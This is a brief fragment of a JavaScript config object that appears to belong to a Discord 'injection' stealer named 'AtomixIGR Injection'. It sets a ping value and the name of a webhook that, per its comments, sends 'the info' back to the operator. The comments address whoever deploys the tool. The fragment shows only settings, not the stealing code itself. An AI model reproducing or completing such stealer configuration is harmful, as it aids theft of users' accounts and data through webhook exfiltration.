...
const config = {
    ...
    ping_val: '@here', //change to @here or <@ID> to ping specific user if you want, will only send it ping_on_run is true
    embed_name: 'AtomixIGR Injection', //name of the webhook thats gonna send the info
